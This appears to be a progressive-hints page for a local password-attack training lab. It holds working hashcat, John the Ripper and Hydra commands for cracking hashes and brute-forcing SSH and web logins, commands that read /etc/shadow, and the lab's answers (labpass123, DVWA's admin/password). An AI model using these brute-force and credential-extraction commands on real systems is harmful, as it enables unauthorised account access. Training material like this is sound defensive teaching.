# Password Attacks Hints

Progressive hints to help you through password cracking challenges.

---

## General Hints

### Hint 1: Identify First, Crack Second

Always identify the hash type before attempting to crack:
```bash
hashid 'HASH_HERE'
hashid -m 'HASH_HERE'  # Shows Hashcat mode
```

### Hint 2: Start Simple

Attack order for efficiency:
1. Dictionary attack (rockyou.txt)
2. Dictionary + rules (best64.rule)
3. Targeted wordlist
4. Mask attack
5. Full brute force (last resort)

### Hint 3: Check Cracked Passwords

```bash
# Hashcat
hashcat -m MODE --show hashes.txt

# John
john --show hashes.txt
```

---

## Hash Identification Hints

<details>
<summary>Hint 1: Common hash lengths</summary>

| Length | Likely Types |
|--------|--------------|
| 32 | MD5, NTLM |
| 40 | SHA1 |
| 64 | SHA256 |
| 128 | SHA512 |

</details>

<details>
<summary>Hint 2: Linux shadow format</summary>

```
$TYPE$SALT$HASH

Types:
$1$  = MD5crypt
$5$  = SHA256crypt
$6$  = SHA512crypt
$y$  = yescrypt
```

</details>

<details>
<summary>Hint 3: Online identification</summary>

If hashid doesn't help:
- https://hashes.com/en/tools/hash_identifier
- https://crackstation.net/ (also looks up known hashes)
</details>

---

## Hashcat Hints

### Mode Selection

<details>
<summary>Hint 1: Finding the right mode</summary>

```bash
# Search for hash type
hashcat --help | grep -i "sha512"
hashcat --help | grep -i "ntlm"

# Common modes:
# 0 = MD5
# 100 = SHA1
# 1000 = NTLM
# 1800 = SHA512crypt
# 3200 = bcrypt
```
</details>

<details>
<summary>Hint 2: Hash format issues</summary>

Some modes need specific format:
```bash
# For shadow hashes, include username:
user:$6$salt$hash

# For NTLM, just the hash:
32ed87bdb5fdc5e9cba88547376818d4
```
</details>

### Performance

<details>
<summary>Hint 1: Slow cracking?</summary>

```bash
# Use optimized kernels
hashcat -m 0 -a 0 -O hashes.txt wordlist.txt

# Increase workload (careful on laptops!)
hashcat -m 0 -a 0 -w 3 hashes.txt wordlist.txt
```
</details>

<details>
<summary>Hint 2: No GPU?</summary>

```bash
# Force CPU (slower but works)
hashcat -m 0 -a 0 -D 1 hashes.txt wordlist.txt

# Or use John instead (CPU-optimized)
john --format=raw-md5 hashes.txt
```
</details>

### Rules

<details>
<summary>Hint 1: Which rules to use?</summary>

Start with these:
```bash
# Good balance
-r /usr/share/hashcat/rules/best64.rule

# More comprehensive
-r /usr/share/hashcat/rules/rockyou-30000.rule

# Combine rules
-r rule1.rule -r rule2.rule
```
</details>

<details>
<summary>Hint 2: Understanding rule syntax</summary>

```
:     # No change
c     # Capitalize first
u     # Uppercase all
$1    # Append 1
^1    # Prepend 1
sa@   # Replace a with @
```
</details>

---

## John the Ripper Hints

<details>
<summary>Hint 1: Format auto-detection</summary>

John usually detects format automatically:
```bash
john hashes.txt
```

If not, specify:
```bash
john --format=raw-md5 hashes.txt
```
</details>

<details>
<summary>Hint 2: Hash extraction tools</summary>

```bash
# Linux shadow
unshadow /etc/passwd /etc/shadow > combined.txt

# SSH keys
ssh2john id_rsa > ssh.txt

# ZIP files
zip2john file.zip > zip.txt

# Find all *2john tools
ls /usr/share/john/
```
</details>

<details>
<summary>Hint 3: John is stuck?</summary>

```bash
# Check status
john --status

# Show cracked so far
john --show hashes.txt

# Use smaller wordlist first
john --wordlist=/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt hashes.txt
```
</details>

---

## Hydra Hints

### SSH Attacks

<details>
<summary>Hint 1: Basic SSH syntax</summary>

```bash
hydra -l username -P wordlist.txt ssh://target
hydra -l username -P wordlist.txt target ssh

# With port
hydra -l username -P wordlist.txt ssh://target:2222
hydra -l username -P wordlist.txt target -s 2222 ssh
```
</details>

<details>
<summary>Hint 2: Connection issues?</summary>

```bash
# Reduce threads
hydra -t 4 -l user -P list.txt ssh://target

# Add wait time
hydra -W 2 -l user -P list.txt ssh://target

# Verbose mode to debug
hydra -V -l user -P list.txt ssh://target
```
</details>

### Web Form Attacks

<details>
<summary>Hint 1: Finding form parameters</summary>

1. Open browser developer tools (F12)
2. Go to Network tab
3. Submit login form
4. Look at POST request body
5. Note: field names, submit button name

Example: `username=test&password=test&Login=Login`
</details>

<details>
<summary>Hint 2: Form syntax</summary>

```bash
# Format: "path:parameters:failure_string"
http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid"

# ^USER^ and ^PASS^ are replaced by hydra
```
</details>

<details>
<summary>Hint 3: Failure string selection</summary>

The failure string appears when login FAILS:
- "Invalid credentials"
- "Login failed"
- "Wrong password"

NOT success messages!

```bash
# Find it by trying a wrong login and noting the error
```
</details>

---

## CyberLab Specific Hints

### Vulnerable SSH (Port 2222)

<details>
<summary>Hint 1: Default credentials</summary>

```bash
# User: labuser
# Password: in common wordlists

# Try:
hydra -l labuser -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
  ssh://localhost -s 2222
```
</details>

<details>
<summary>Hint 2: The password</summary>

The password is: `labpass123`

It's in rockyou.txt and most common password lists.
</details>

### Shadow File

<details>
<summary>Hint 1: Getting the shadow file</summary>

After SSH access:
```bash
# View shadow
cat /etc/shadow

# Or extract from container
docker exec lab-buffer-overflow cat /etc/shadow
```
</details>

<details>
<summary>Hint 2: Hash format</summary>

Look for lines like:
```
labuser:$6$salt$hash:19000:0:99999:7:::

# $6$ means SHA512crypt
# Hashcat mode: 1800
```
</details>

### DVWA Login

<details>
<summary>Hint 1: Default DVWA credentials</summary>

Username: `admin`
Password: `password`

These are in any common wordlist.
</details>

<details>
<summary>Hint 2: Form attack syntax</summary>

```bash
hydra -l admin -P wordlist.txt localhost http-post-form \
  "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" \
  -s 8081
```
</details>

---

## Troubleshooting

### "No hashes loaded"

<details>
<summary>Solution</summary>

```bash
# Check hash format
cat hashes.txt

# Try specifying format explicitly
john --format=raw-md5 hashes.txt

# For hashcat, verify mode
hashcat -m 0 --show hashes.txt
```
</details>

### "Exhausted" but no passwords

<details>
<summary>Solution</summary>

```bash
# Try different wordlist
# Try adding rules
hashcat -m 0 -a 0 hashes.txt wordlist.txt -r best64.rule

# Try mask attack for patterns
hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a
```
</details>

### Hydra "too many connections"

<details>
<summary>Solution</summary>

```bash
# Reduce threads
hydra -t 1 ...

# Add delay
hydra -W 5 ...

# The service might be rate-limiting
```
</details>

### "Connection refused"

<details>
<summary>Solution</summary>

```bash
# Verify service is running
docker ps

# Check port is correct
nmap localhost -p 2222

# Make sure you're using right protocol
# ssh vs ftp vs http-post-form
```
</details>

---

## Quick Reference

### Hashcat Modes (Common)

```
0     = MD5
100   = SHA1
1000  = NTLM
1400  = SHA256
1800  = SHA512crypt ($6$)
3200  = bcrypt
500   = MD5crypt ($1$)
7400  = SHA256crypt ($5$)
```

### John Formats (Common)

```
raw-md5
raw-sha1
raw-sha256
nt
sha512crypt
bcrypt
```

### Hydra Protocols

```
ssh
ftp
http-post-form
http-get-form
mysql
postgres
smb
rdp
```

### Wordlists (Kali)

```
/usr/share/wordlists/rockyou.txt
/usr/share/seclists/Passwords/Common-Credentials/
/usr/share/seclists/Passwords/darkweb2017-top10000.txt
```

---

**Back to:** [README](./README.md) | [Walkthrough](./walkthrough.md)
